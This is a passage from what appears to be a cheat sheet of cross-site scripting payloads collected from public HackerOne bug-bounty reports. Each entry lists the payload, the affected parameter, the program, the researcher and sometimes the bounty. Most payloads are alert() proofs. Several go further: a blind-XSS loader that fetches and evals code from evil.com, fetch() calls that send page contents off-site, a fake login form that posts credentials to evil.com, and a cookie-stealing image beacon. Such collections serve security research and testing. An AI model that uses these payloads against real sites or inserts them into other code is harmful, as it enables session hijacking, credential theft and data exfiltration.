%3d=%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3dTOP_OF_RECORD%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d&ATprogram=1&E=&fullname=nbfgkjaa'%22()%26%25<geeknik><ScRiPt%20>prompt(/XSS/)</ScRiPt>&glomf=1&glorf=1&numusers=xmkucffw&org=1&other=1&phone=555-666-0606&recType%21=-██████-&source=1&sponsorglomf=1&sponsorname=xmkucffw&sponsorphone=555-666-0606
```

**Parameter:** `fullname`
— [reflected xss @ www.█████████](https://hackerone.com/reports/225020) · U.S. Dept Of Defense · [geeknik](https://hackerone.com/geeknik)

### `922f52b0`

```
curl "http://localhost:3000" -H 'User-Agent: <script>alert("XSS")</script>' > poc.html
```

**Parameter:** `User-Agent`
— [XSS in express-useragent through HTTP User-Agent](https://hackerone.com/reports/362702) · Node.js third-party modules · [b9b86c2fc8409c628fb3de6](https://hackerone.com/b9b86c2fc8409c628fb3de6)

### `113bdbfb`

```
https://target.com/nin/success?message=lol&nin=<script
```

**Parameter:** `nin`
— [Reflected XSS in https://target.com/nin/success?message=lol&nin=<VULNERABLE>](https://hackerone.com/reports/2039384) · MTN Group · [hazemhussien99](https://hackerone.com/hazemhussien99)


## HTML attribute injection XSS using onerror handler

### `bcd905a3`

```
https://target.com/?contact[email]%20onfocus%3djavascript:alert(%27xss%27)%20autofocus%20a=a&form_type[a]aaa
```

**Parameter:** `contact[email]`
— [Reflective Cross-site Scripting via Newsletter Form](https://hackerone.com/reports/709336) · Shopify · [gam817](https://hackerone.com/gam817) · $2,000.0

### `5e09e6db`

```
'"><img src=x onerror=alert(1)>
```

**Parameter:** `company_name`
— [\[target.com\] Reflective XSS](https://hackerone.com/reports/106678) · Informatica · [robd4k](https://hackerone.com/robd4k)

### `881b7dce`

```
'-->">'>'"<script>prompt(document.domain)</script>;" f0r=TRUE
```

— [Reflected XSS on Zomato API](https://hackerone.com/reports/125762) · Eternal · [murat](https://hackerone.com/murat)

### `ddb806e6`

```
<html onmouseover=alert(1)>
```

— [Unauthenticated Stored XSS on <any>.target.com via checkout page](https://hackerone.com/reports/189378) · Shopify · [zombiehelp54](https://hackerone.com/zombiehelp54)

### `0de1f87b`

```
"><u>XSS Vulnerability</u><marquee+onstart='alert(document.cookie)'>XSS
```

**Parameter:** `domain`
— [Stored XSS in '' Section and WAF Bypass](https://hackerone.com/reports/382625) · Semrush · [jimgogogo](https://hackerone.com/jimgogogo)

### `268005e8`

```
2.  "><img src=x onerror=alert(document.domain)>
```

**Parameter:** `post_content`
— [Stored XSS (Hexo-admin plugin)](https://hackerone.com/reports/716570) · Node.js third-party modules · [vu1n](https://hackerone.com/vu1n)

### `72ad3742`

```
<input type="hidden" name="mail&#95;to&#95;first&#95;name" value="test&quot;&#59;&lt;&#47;script&gt;&lt;script&gt;alert&#40;&quot;HACKED&#32;BY&#32;Sleep&#32;NOt&#32;Found&quot;&#41;&lt;&#47;script&gt;" />
```

**Parameter:** `mail_to_first_name`
— [Self XSS + CSRF Leads to Reflected XSS in https://████/ ](https://hackerone.com/reports/1109544) · U.S. Dept Of Defense · [sleepnotf0und](https://hackerone.com/sleepnotf0und)

### `c07f2962`

```
<a class="fixed-top fixed-bottom text-hide gl-font-size-42 cursor-default" href=# data-disable-with="<img src=x onerror=alert(document.domain)>">'
```

— [XSS: `v-safe-html` is not safe enough](https://hackerone.com/reports/1579645) · GitLab · [yvvdwf](https://hackerone.com/yvvdwf)


## Stored XSS via script tag in ticket content

### `a8569524`

```
<script>
function attack(){
    const ctx = window.open(location.origin+'/admin/themes', '_blank')
    const data = JSON.stringify({
        message: 'Shopify.API.pushState',
        data: {pathname: "invalid:pages/xss"}
    });

    let interval;
    interval = setInterval(function(){
        if (window.attackSuccess) {
            clearInterval(interval)
        } else {
            ctx.postMessage(data)
        }
    }, 500)
}
attack()
</script>
<a href="javascript:attack()" style="display:bl
```

— [Inject page in admin panel via Shopify.API.pushState with protocol invalid](https://hackerone.com/reports/868615) · Shopify · [tiago-danin](https://hackerone.com/tiago-danin) · $500.0

### `8001d319`

```
<script>alert('XSS');</script>
```

— [Stored XSS from ticket messages in admin table in SupportFlow](https://hackerone.com/reports/145091) · Ian Dunn · [whitehatter](https://hackerone.com/whitehatter) · $50.0

### `aba9e512`

```
</TITLE><SCRIPT>alert("XSS By Rishail 2025");</SCRIPT>
```

**Parameter:** `Contact Name`
— [Stored Cross-Site Scripting (XSS) in "Add Contact" Name Field – MainWP Plugin](https://hackerone.com/reports/3176981) · MainWP · [rishail01](https://hackerone.com/rishail01) · $50.0

### `fadcbab1`

```
<script>alert('xss')</script>
```

**Parameter:** `name`
— [Stored XSS in Node-Red](https://hackerone.com/reports/349146) · Node.js third-party modules · [misterch0c](https://hackerone.com/misterch0c)

### `a833ac2a`

```
<script>alert()</script>
```

**Parameter:** `content`
— [Stored-Xss at target.com/projects/ affected on project chat members](https://hackerone.com/reports/779908) · Lab45 · [hundredpercent](https://hackerone.com/hundredpercent)

### `a9696783`

```
3. On the name, enter payload:  </script><svg onload=alert(document.domain)>
```

— [Stored XSS in Name of Team Member Invitation](https://hackerone.com/reports/786301) · Localize · [abdulsec](https://hackerone.com/abdulsec)

### `95de6053`

```
<script>alert(0)</script>
```

**Parameter:** `nickname`
— [Cross-site Scripting (XSS) - Stored | target.com](https://hackerone.com/reports/1161241) · Acronis · [quadrant](https://hackerone.com/quadrant)

### `4cdadc8b`

```
'"></script><img src=x onerror=alert(1)>{{'7'*7}}
```

**Parameter:** `link_name`
— [Stored XSS via LINK Name.](https://hackerone.com/reports/1392262) · Insightly · [xploiterr](https://hackerone.com/xploiterr)


## Reflected XSS via script injection in the username part of the URL

### `f1fee819`

```
https://target.com/unsubscribe?email=kolabro</script><script>alert(document.domain)</script>
```

**Parameter:** `email`
— [RXSS on unsubscribe feature (target.com)](https://hackerone.com/reports/733152) · Clario · [sec0ndw0lf](https://hackerone.com/sec0ndw0lf) · $75.0

### `cd48a960`

```
https://target.com/account/testcatplzignore%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain
```

**Parameter:** `username`
— [Reflected XSS in target.com](https://hackerone.com/reports/149855) · Imgur · [logue](https://hackerone.com/logue)

### `3b819d1d`

```
target.com/badges?hostname=hostname" type="text/javascript"> /*&hostname=*/alert('XSS\n-Rohit Dua'); //
```

**Parameter:** `hostname`
— [Cross Site Scripting(XSS) on IRCCloud Badges Page (using Parameter Pollution)](https://hackerone.com/reports/150083) · IRCCloud · [rohitdua](https://hackerone.com/rohitdua)

### `275f65ee`

```
<script type="text/javascript">
...
ga('set', 'dimension1', 'board-'-alert(document.domain)-'');
ga('set', 'dimension2', 'False');
ga('set', 'dimension3', 'False');});});</script>
```

— [\[target.com\] 429 Too Many Requests Error-Page XSS](https://hackerone.com/reports/189768) · Quora · [bobrov](https://hackerone.com/bobrov)

### `f4dd4931`

```
<html>
  <body>
    <form action="https://target.com/my-posts/api/image/upload/?CKEditor=text&CKEditorFuncNum=dadasd</script><script>alert(document.domain)</script>&langCode=en" method="POST">
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

**Parameter:** `CKEditorFuncNum`
— [Post Based XSS On Upload Via CK Editor \[target.com\]](https://hackerone.com/reports/375352) · Semrush · [apapedulimu](https://hackerone.com/apapedulimu)

### `b3292ef6`

```
Payload 1: Mouse Over XSS
---------------------------
%0d%0a</script><h1+onmouseover=alert(document.cookie)>MOUSEOVER_XSS</h1>


Payload 2: 
---------
%0d%0a</script><img+src=x+onerror=alert(document.domain)>
```

**Parameter:** `userPage`
— [Reflected Cross Site Scripting at  ColdFusion Debugging Panel  http://target.com/CFIDE/debug/cf_debugFr.cfm](https://hackerone.com/reports/1166918) · Acronis · [ub3rsick](https://hackerone.com/ub3rsick)

### `2d077d97`

```
http://target.com/CFIDE/debug/cf_debugFr.cfm?userPage=%0d%0a</script><h1+onmouseover=alert(document.cookie)>MOUSEOVER_XSS</h1>

http://target.com/CFIDE/debug/cf_debugFr.cfm?userPage=%0d%0a</script><img+src=x+onerror=alert(document.domain)>
```

**Parameter:** `userPage`
— [Reflected Cross Site Scripting at  ColdFusion Debugging Panel  http://target.com/CFIDE/debug/cf_debugFr.cfm](https://hackerone.com/reports/1166918) · Acronis · [ub3rsick](https://hackerone.com/ub3rsick)


## Stored XSS using <img onerror> attribute injection

### `cead62d3`

```
<http://\<img\ style=\"display:none\"\ src=0\ onerror=\"alert(\'Uh\ oh\')\"\>>
```

— [Vulnerability with the way \ escaped characters in <http://target.com> style links are rendered](https://hackerone.com/reports/46072) · HackerOne · [danlec](https://hackerone.com/danlec) · $5,000.0

### `06c9ec7e`

```
https://target.com/admin/menus/new                                             "><img src="x" onerror="alert(document.cookie)">
```

— [xss stored in https://your target.com/admin/](https://hackerone.com/reports/887879) · Shopify · [lbro](https://hackerone.com/lbro) · $1,000.0

### `280a5372`

```
invalid@example.org REJECT 5.1.1 <img src="" onerror="alert('hackerone!')" />
```

— [Stored XSS via SMTP Error Message](https://hackerone.com/reports/2956266) · XVIDEOS · [chse_](https://hackerone.com/chse_) · $250.0

### `27f35a50`

```
<html> <img src = x onerror = alert (1)> </html>
```

— [XSS in target.com can compromise data of evil.com](https://hackerone.com/reports/862882) · Reddit · [keer0k](https://hackerone.com/keer0k)

### `2177f779`

```
<img src=x onerror=alert(document.cookie)>
```

**Parameter:** `city`
— [Stored Cross-site Scripting on target.com/forum/](https://hackerone.com/reports/1122513) · Acronis · [h4x0r_dz](https://hackerone.com/h4x0r_dz)

### `ad750c57`

```
Meteor.call('createChannel', 'valid-name', [], false, {}, { name: 'edit me <img src onerror=alert(origin)>' })
```

**Parameter:** `name`
— [Post-Auth Stored XSS with User Interaction leads to Remote Code Execution](https://hackerone.com/reports/1132202) · Rocket.Chat · [sonarsource](https://hackerone.com/sonarsource)

### `024a632e`

```
2 . Put the payload as answer <img src=x onerror=alert(document.cookie)>
```

— [Stored XSS on  target.com](https://hackerone.com/reports/1987172) · Automattic · [riadalrashed](https://hackerone.com/riadalrashed)


## Stored XSS by injecting a script tag into the 'site_index' form field

### `9ab8a1b6`

```
<u>Reported by Merchant(ID)</u> : <a style="opacity: 1; color: #000000; text-decoration:underline" href="https://target.com/users/43211589">43211589</a><br><u>Report Reason ID</u> : 5 (Other (mention reason below).)<br><u>Additional Text</u> : H
H
H
H
H
''"&gt;<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//evil.com");a.send();</script>
```

**Parameter:** `additional_text`
— [Blind XSS - Report review - Admin panel](https://hackerone.com/reports/314126) · Eternal · [gerben_javado](https://hackerone.com/gerben_javado) · $350.0

### `234d1f1b`

```
"><script>alert('stored xss')<%2fscript>
```

**Parameter:** `site_index`
— [\[redacted\]](https://hackerone.com/reports/26482) · ExpressionEngine · [deadlock](https://hackerone.com/deadlock)

### `09f3425b`

```
https://target.com/en/home/tttttt</script><script>alert(0)</script>                                                                                     </script><script>alert(0)</script>
```

— [XSS Vulnerability on all pages](https://hackerone.com/reports/60201) · Mobile Vikings · [ddworken](https://hackerone.com/ddworken)

### `87f32fc9`

```
<script>alert(1);//
```

**Parameter:** `group_name`
— [Tweet Deck XSS- Persistent- Group DM name](https://hackerone.com/reports/119022) · X / xAI · [akhil-reni](https://hackerone.com/akhil-reni)

### `e351e2bd`

```
<p>These are not the payloads you're looking for... </p><script>console.error('Stored XSS, browser:', navigator.appVersion)</script>
```

**Parameter:** `headline`
— [Stored XSS in Headline TextControl element in Express forms \[ concrete5 8.1.0 \]](https://hackerone.com/reports/230278) · Concrete CMS · [bl4de](https://hackerone.com/bl4de)

### `7c8c6a70`

```
'<script>alert(1)</script>'
```

**Parameter:** `db_name`
— [Reflected XSS vulnerability in Database name field on installation screen](https://hackerone.com/reports/289330) · Concrete CMS · [sts](https://hackerone.com/sts)

### `85a681cd`

```
<input type="hidden" name="apellido" value="<script>alert()</script>" />
```

**Parameter:** `apellido`
— [Stored XSS + CSRF in "apellido" value](https://hackerone.com/reports/2037234) · Mars · [never_die](https://hackerone.com/never_die)


## HTML <img> onerror XSS that exfiltrates data via fetch with base64‑encoded document body

### `504008e3`

```
Dinosaurs secret life<img src=x  onerror=alert(1)>.png
```

**Parameter:** `filename`
— [Wordpress 4.7.2 - Two XSS in Media Upload when file too large.](https://hackerone.com/reports/203515) · WordPress · [skansing](https://hackerone.com/skansing)

### `48034088`

```
"><img src=x onerror=alert(1)>
```

**Parameter:** `title`
— [Stored XSS via Discussion Title and Send as Email attribute in \[target.com\]](https://hackerone.com/reports/203912) · Informatica · [fillawful](https://hackerone.com/fillawful)

### `459e8e30`

```
curl -X POST http://TARGET:3000/api/v1/livechat/message \
  -H 'Content-Type: application/json' \
  -d '{
    "token":"poc-token-001",
    "rid":"ROOM_ID",
    "msg":"<img src=x onerror=\"fetch(\\\"https://target.com/exfil?d=\\\"+btoa(document.body.innerText))\">"
  }'
```

**Parameter:** `msg`
— [Stored XSS in Rocket.Chat HTML File Export — Unauthenticated Entry via LiveChat](https://hackerone.com/reports/3779690) · Rocket.Chat · [olidayw](https://hackerone.com/olidayw)

### `ed84ed9d`

```
<p><strong>guest-2</strong> (Wed, 03 Jun 2026 13:23:22 GMT):<br/>
<img src=x onerror="fetch(\"https://target.com/exfil?d=\"+btoa(document.body.innerText))">
</p>
```

— [Stored XSS in Rocket.Chat HTML File Export — Unauthenticated Entry via LiveChat](https://hackerone.com/reports/3779690) · Rocket.Chat · [olidayw](https://hackerone.com/olidayw)

### `e0183b77`

```
<img src=x onerror="fetch('https://target.com/exfil',{method:'POST',body:btoa(document.body.innerText)})">
```

— [Stored XSS in Rocket.Chat HTML File Export — Unauthenticated Entry via LiveChat](https://hackerone.com/reports/3779690) · Rocket.Chat · [olidayw](https://hackerone.com/olidayw)

### `744c614b`

```
<img src=x onerror="
  document.body.innerHTML='<div style=\'font-family:sans-serif;max-width:400px;margin:80px auto;padding:40px;border:1px solid #ddd;border-radius:8px\'>'
    +'<img src=https://target.com/images/logo/logo-dark.svg width=200 style=margin-bottom:20px>'
    +'<h3>Session Expired</h3>'
    +'<p style=color:#666>Your session has expired. Please sign in again to view this export.</p>'
    +'<form action=https://evil.com/creds method=POST>'
    +'<input name=user placeholde
```

— [Stored XSS in Rocket.Chat HTML File Export — Unauthenticated Entry via LiveChat](https://hackerone.com/reports/3779690) · Rocket.Chat · [olidayw](https://hackerone.com/olidayw)


## Reflected XSS via HTML attribute injection using an <img> tag with onerror executing alert(document.domain)

### `112c3043`

```
Address.AddressName=bbbbb%22%3E&Address.FirstName=z%22 onmouseover="alert('Hackerone')" style="position:fixed;left:0;top:0;width:9999px;height:9999px;">&Address.LastName=bbbbb%22%3E&Address.Country=US&Address.AddressLine1=bbbbb%22%3E&Address.AddressLine2=aaaa%22%3E&Address.City=aaaa%22%3E&Address.CountrySubdivision=AK&Address.PostalCode=75000&Address.PhoneNumber=███████&Address.PhoneExtension=&Address.AddressType=Registration&Address.AddressId=32ecef14-f8af-4b5e-adad-d8d2adc8ddad&Address.Verific
```

**Parameter:** `Address.FirstName`
— [Stored XSS in Adress Book (target.com/account/profile)](https://hackerone.com/reports/186554) · Starbucks · [myst404](https://hackerone.com/myst404)

### `7cdca4ae`

```
http://████/7/0/33/1d/target.com/search?what=Binit&where=Binit%22%3E%3Cimg%20src%3Dbinit%20onerror%3Dalert%28document.domain%29%3E
```

**Parameter:** `where`
— [Open Akamai ARL XSS at ████████](https://hackerone.com/reports/1317024) · U.S. Dept Of Defense · [whoisbinit](https://hackerone.com/whoisbinit)

### `4d90e40a`

```
https://█████████/7/0/33/1d/target.com/search?what=Binit&where=Binit%22%3E%3Cimg%20src%3Dbinit%20onerror%3Dalert%28document.domain%29%3E
```

**Parameter:** `where`
— [Open Akamai ARL XSS at ████████](https://hackerone.com/reports/1317031) · U.S. Dept Of Defense · [whoisbinit](https://hackerone.com/whoisbinit)

### `f1ba9c33`

```
https://██████/7/0/33/1d/target.com/search?what=Binit&where=Binit%22%3E%3Cimg%20src%3Dbinit%20onerror%3Dalert%28document.domain%29%3E
```

**Parameter:** `where`
— [Open Akamai ARL XSS at ████████](https://hackerone.com/reports/1317031) · U.S. Dept Of Defense · [whoisbinit](https://hackerone.com/whoisbinit)

### `08b6fe70`

```
https://████████/fcgi-bin/release.py?project=aaa%3Ch1%20onauxclick=confirm(document.domain
```

**Parameter:** `project`
— [Reflected XSS | https://████](https://hackerone.com/reports/1736432) · U.S. Dept Of Defense · [x3ph_](https://hackerone.com/x3ph_)

### `eccf1db4`

```
https://█████████/fcgi-bin/release.py?project=aaa%3Ch1%20onauxclick=confirm(document.domain
```

**Parameter:** `project`
— [Reflected XSS | https://████](https://hackerone.com/reports/1736432) · U.S. Dept Of Defense · [x3ph_](https://hackerone.com/x3ph_)


## Reflected XSS via an img tag with onerror attribute injected through a URL‑encoded query parameter.

### `8ea4158a`

```
██████████?████████=%253Cimg/src/onerror=alert(document.domain)%253E
```

— [Reflected XSS at ████ via ██████████= parameter ](https://hackerone.com/reports/1305472) · U.S. Dept Of Defense · [zhenwarx](https://hackerone.com/zhenwarx)

### `6b9fed88`

```
<img/src/onerror=alert(document.domain)>
```

— [Reflected XSS at ████ via ██████████= parameter ](https://hackerone.com/reports/1305472) · U.S. Dept Of Defense · [zhenwarx](https://hackerone.com/zhenwarx)

### `6b08d3d3`

```
██████████?█████=%253Cimg/src/onerror=alert(document.domain)%253E
```

— [Reflected XSS at ████ via ██████████= parameter ](https://hackerone.com/reports/1305472) · U.S. Dept Of Defense · [zhenwarx](https://hackerone.com/zhenwarx)

### `9df0635c`

```
'"><img src=x id=█████ onerror=eval(atob(this.id))>
```

— [Blind XSS in target.com/████████ via /reviews/ratings/{uuid}](https://hackerone.com/reports/1558010) · HackerOne · [bugra](https://hackerone.com/bugra)

### `47b8e544`

```
https://target.com/webview/v1?phone=████████&token=██████████&service=cargo&locale=en&jwt=%22%3E%3Cimg%20src=raw%20onerror=alert(%22hackerone%22
```

**Parameter:** `jwt`
— [#2 XSS on target.com](https://hackerone.com/reports/2015074) · inDrive · [maxdha](https://hackerone.com/maxdha)

### `8d09bf75`

```
https://target.com/webview/v1/transport-change?phone=██████&token=█████████&service=intercity3&jwt=fw%22%3E%3Cimg%20src=fwa%20onerror=alert(1
```

**Parameter:** `jwt`
— [#3 XSS on target.com](https://hackerone.com/reports/2028265) · inDrive · [maxdha](https://hackerone.com/maxdha)


## Reflected XSS by injecting an <img> tag in the URL path segment after /type/

### `0dcedc21`

```
https://target.com/themes/filter/blog/type/%22%3E%3Cimg%20src=a%20onerror=alert%28document.domain%29%3E
```

— [XSS at target.com](https://hackerone.com/reports/111500) · Automattic · [valievkarim](https://hackerone.com/valievkarim)

### `31d2991e`

```
http://target.com/admin/campaign-zone-zones.php?_=&clientid=1&campaignid=1&status=available%22%3E%3Cimg%20src=1%20onerror=alert(document.domain)%3E&text=
```

**Parameter:** `status`
— [Reflected XSS on /admin/campaign-zone-zones.php](https://hackerone.com/reports/1097979) · Revive Adserver · [solov9ev](https://hackerone.com/solov9ev)

### `415cf430`

```
Meteor.call("sendMessage", {
  rid: "<ROOM_ID>",
  msg: "",
  t: "message_snippeted",
  snippetId: "\"><img src=x onerror=alert(1) style=\"display: none;\" x=\"",
  snippetName: ""
}, (...args) => console.log(...args));
```

**Parameter:** `snippetId`
— [XSS in various MessageTypes](https://hackerone.com/reports/1379400) · Rocket.Chat · [gronke](https://hackerone.com/gronke)

### `5c5cd10b`

```
Meteor.call("sendMessage", {
  rid: "<ROOM_ID>",
  msg: "",
  t: "subscription-role-removed",
  role: "<img src=x onerror=alert(1) />"
}, (...args) => console.log(...args));
```

**Parameter:** `role`
— [XSS in various MessageTypes](https://hackerone.com/reports/1379400) · Rocket.Chat · [gronke](https://hackerone.com/gronke)

### `fb5977f3`

```
Meteor.call("sendMessage", {
  rid: "<ROOM_ID>",
  msg: "",
  t: "livechat_transfer_history",
  transferData: {
    scope: "agent",
    transferredTo: {
      name: "<img src=x onerror=alert(1) />"
    }
  }
}, (...args) => console.log(...args));
```

**Parameter:** `name`
— [XSS in various MessageTypes](https://hackerone.com/reports/1379400) · Rocket.Chat · [gronke](https://hackerone.com/gronke)

### `15ff1246`

```
Meteor.call("sendMessage", {
  rid: "<ROOM_ID>",
  msg: "",
  t: "omnichannel_placed_chat_on_hold",
  comment: "<img src=x onerror=alert(1) />"
}, (...args) => console.log(...args));
```

**Parameter:** `comment`
— [XSS in various MessageTypes](https://hackerone.com/reports/1379400) · Rocket.Chat · [gronke](https://hackerone.com/gronke)


## Stored XSS breaking out of script tag with image onerror

### `a79894c7`

```
</script>"><img src=x onerror=alert(0)>
```

— [Persistent class XSS \[the fuck\]](https://hackerone.com/reports/6412) · Khan Academy · [smiegles](https://hackerone.com/smiegles)

### `9e8c3f2a`

```
</script><script src="//domain">
```

**Parameter:** `name`
— [Stored XSS on target.com](https://hackerone.com/reports/85488) · Vimeo · [stefanovettorazzi](https://hackerone.com/stefanovettorazzi)

### `56e4388f`

```
</script><script src=/ñ.xyz>
```

**Parameter:** `name`
— [Stored XSS on target.com](https://hackerone.com/reports/85488) · Vimeo · [stefanovettorazzi](https://hackerone.com/stefanovettorazzi)

### `122d1fa3`

```
<div class="form-group">
				<label for="body" class="control-label">Message</label>				<textarea id="msgBody" name="msgBody" rows="8" class="span5 form-control">


-------------------- Original Message --------------------
From: kotek
Date Sent: Jul 9, 2017, 9:55 PM
Subject: Problem with page!!!

Hi, could you please take a look at this and reply? Thanks!

</textarea>
<script>
        var i = document.createElement('img')
        i.src = 'https://target.com/?c=' + document.cookie;

```

— [Stored XSS in Private Messages 'Reply' allows to execute malicious JavaScript against any user while replying to the message which contains payload](https://hackerone.com/reports/247517) · Concrete CMS · [bl4de](https://hackerone.com/bl4de)

### `6b00df53`

```
';alert('chron0x');'
```

**Parameter:** `search`
— [Reflected XSS on ███████](https://hackerone.com/reports/1062380) · U.S. Dept Of Defense · [0x0d0](https://hackerone.com/0x0d0)

### `a93be798`

```
http://██████.target.com/"><img+src=z+onerror=console.log(
```

— [Stored XSS on the "target.com/extras-widgets" url at "Recent comments by" module with malicious blog url](https://hackerone.com/reports/1083734) · Automattic · [superpan](https://hackerone.com/superpan)


## Stored XSS by injecting an <img> tag with onerror handler into the 'name' field

### `d7019d11`

```
deploy:
      stage: deploy
      script:
        - echo "Example"
      environment:
        name: production
        url: https://target.com
        kubernetes:
          namespace: <img src=x onerror=alert(1)>
      only:
      - master
```

**Parameter:** `namespace`
— [Stored XSS on the job page](https://hackerone.com/reports/856554) · GitLab · [mike12](https://hackerone.com/mike12) · $3,000.0

### `9f2f4bed`

```
"x><img src=a onerror=alert(1)>
```

**Parameter:** `name`
— [Stored XSS on new Calling plugin (spreed)](https://hackerone.com/reports/190870) · Nextcloud · [coolboss](https://hackerone.com/coolboss)

### `9fc178a0`

```
> "><img src=/ onerror="alert(location.host)"
```

— [DOM based XSS in the WooCommerce plugin](https://hackerone.com/reports/507139) · Automattic · [wild0ni0n](https://hackerone.com/wild0ni0n)

### `38abf45c`

```
gem '<img/src/onerror=alert(location)>', '2'
```

— [Double linking cause XSS (but blokeced by CSP in target.com)](https://hackerone.com/reports/729341) · GitLab · [ooooooo_q](https://hackerone.com/ooooooo_q)

### `c9372c80`

```
https://target.com/wiki/pages/createpage.action?spaceKey=tcwiki&parentPageString=powerpuff_hackerone%22%3E%3Cimg%20src=X%20onerror=alert(document.cookie
```

**Parameter:** `parentPageString`
— [Reflected XSS on https://target.com/wiki/pages/createpage.action](https://hackerone.com/reports/866576) · Lab45 · [meryem0x](https://hackerone.com/meryem0x)

### `f5e3eb88`

```
)%3E&labelsString=%22%3E%3Cimg+src%3DX+onerror%3Dalert(document.domain)%3E
```

**Parameter:** `labelsString`
— [Reflected XSS on https://target.com/wiki/pages/createpage.action](https://hackerone.com/reports/866576) · Lab45 · [meryem0x](https://hackerone.com/meryem0x)


## JavaScript‑URI XSS (javascript: scheme) stored in the Editor Link field

### `af17d738`

```
<Button href="javascript://%0aalert(document.domain)">XSS</Button>
```

— [XSS vulnerability without a content security bypass in a `CUSTOM` App through Button tag](https://hackerone.com/reports/1823216) · Stripe · [saajanbhujel](https://hackerone.com/saajanbhujel) · $2,000.0

### `4e9a412a`

```
javascript:alert(document.cookie)//https://target.com/
```

**Parameter:** `ionUrl`
— [Reflected XSS in the shared note view on https://target.com](https://hackerone.com/reports/1518343) · Evernote · [sarka](https://hackerone.com/sarka) · $500.0

### `cab5d6d0`

```
javascript:confirm(document.domain)
```

— [\[target.com\] Stored Self-XSS via Editor Link in Profile](https://hackerone.com/reports/223331) · Weblate · [ysx](https://hackerone.com/ysx)

### `507b4155`

```
javascript:alert()
```

— [XSS \[flow\] - on target.com/paypalme/my/landing (requires user interaction)](https://hackerone.com/reports/425200) · PayPal · [stefanovettorazzi](https://hackerone.com/stefanovettorazzi)

### `0e3136ee`

```
<a href='javascript:alert(document.domain);'>Click Me</a>
```

— [Stored XSS on target.com  evil.com via Thank You Header](https://hackerone.com/reports/1842822) · Automattic · [0xwega74](https://hackerone.com/0xwega74)


## JavaScript URL XSS using "javascript://" scheme with encoded newline

### `6d61f07b`

```
javascript://%0aalert(document.cookie)
```

**Parameter:** `url`
— [XSS on redirection page( Bypassed) ](https://hackerone.com/reports/316319) · Semrush · [kunal94](https://hackerone.com/kunal94)

### `f339f25d`

```
javascript://%250Aalert(document.location="https://target.com",document.location="https://evil.com")
```

**Parameter:** `url`
— [XSS on redirection page( Bypassed) ](https://hackerone.com/reports/316319) · Semrush · [kunal94](https://hackerone.com/kunal94)

### `32bf73f9`

```
https://target.com/redirect?url=javascript://%250Aalert(document.cookie
```

**Parameter:** `url`
— [XSS on redirection page( Bypassed) ](https://hackerone.com/reports/316319) · Semrush · [kunal94](https://hackerone.com/kunal94)

### `fcee0c3f`

```
https://target.com/redirect?url=javascript://%250Aalert(document.domain
```

**Parameter:** `url`
— [XSS on redirection page( Bypassed) ](https://hackerone.com/reports/316319) · Semrush · [kunal94](https://hackerone.com/kunal94)

### `deb8928a`

```
https://target.com/redirect?url=javascript://%250Aalert(document.location=
```

**Parameter:** `url`
— [XSS on redirection page( Bypassed) ](https://hackerone.com/reports/316319) · Semrush · [kunal94](https://hackerone.com/kunal94)


## Reflected XSS via image onerror attribute injection

### `0effde15`

```
https://target.com/authentication/fb_callback?error=access_denied&error_code=200&error_description=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%28document.domain%29%3E
```

**Parameter:** `error_description`
— [Reflected XSS in target.com](https://hackerone.com/reports/770349) · X / xAI · [jubabaghdad](https://hackerone.com/jubabaghdad)

### `a6336579`

```
https://target.com/authentication/fb_callback?error=access_denied&error_code=200&error_description=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%28document.cookie%29%3E
```

**Parameter:** `error_description`
— [Reflected XSS in target.com](https://hackerone.com/reports/770349) · X / xAI · [jubabaghdad](https://hackerone.com/jubabaghdad)

### `8805a004`

```
GET /header.aspx HTTP/1.1
Host: evil.com
https://target.com/search?hl=en&q=testing'"()&%"><img src=x onerror=alert(document.domain)>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: _ga=GA1.1.535977033.1609258177; _gid=GA1.3.1739427388.1609466879; ASP.NET_SessionId=31wr
```

**Parameter:** `q`
— [Reflected XSS on target.com.g](https://hackerone.com/reports/1069528) · MTN Group · [lu3ky-13](https://hackerone.com/lu3ky-13)

### `5b7f550f`

```
"><img+src=z+onerror=console.log(
```

— [Stored XSS on the "target.com/extras-widgets" url at "Recent comments by" module with malicious blog url](https://hackerone.com/reports/1083734) · Automattic · [superpan](https://hackerone.com/superpan)

### `b6734404`

```
https://█████/████&url=http%3a%2f%2ftarget.com%2f%3Cimg+src%3dx+onerror%3dalert%28document.domain%29%3E
```

**Parameter:** `url`
— [Reflected XSS through clickjacking at https://████](https://hackerone.com/reports/1149144) · U.S. Dept Of Defense · [nagli](https://hackerone.com/nagli)


## Reflected XSS by injecting an `alert(document.cookie)` payload into the `theme_handle` query parameter

### `81be2891`

```
');alert('XSS
```

**Parameter:** `properties[builder_id]`
— [XSS on target.com](https://hackerone.com/reports/116006) · Shopify · [mdv](https://hackerone.com/mdv) · $500.0

### `5062ab93`

```
https://target.com/?theme_handle=xx%27-alert(document.cookie)-%27&style_id=1&style_handle=1&preview_theme_id=<theme_ID>
```

**Parameter:** `theme_handle`
— [Reflected XSS in <any>.target.com through theme preview](https://hackerone.com/reports/226428) · Shopify · [zombiehelp54](https://hackerone.com/zombiehelp54)

### `8aad013f`

```
https://target.com/?theme_handle=xx%27-alert(document.cookie)-%27&style_id=1&style_handle=1&preview_theme_id=3572
```

**Parameter:** `theme_handle`
— [Reflected XSS in <any>.target.com through theme preview](https://hackerone.com/reports/226428) · Shopify · [zombiehelp54](https://hackerone.com/zombiehelp54)

### `5d8322f5`

```
https://██████/SA1/SAReplay/default.asp?WhatSubmitted=Empty%22;-alert(%27tmz900%27
```

**Parameter:** `WhatSubmitted`
— [RXSS on █████████](https://hackerone.com/reports/1627616) · U.S. Dept Of Defense · [tmz900](https://hackerone.com/tmz900)

### `7a6f69a7`

```
https://████████/SA1/SAReplay/default.asp?WhatSubmitted=Empty%22;-alert(%27tmz900%27
```

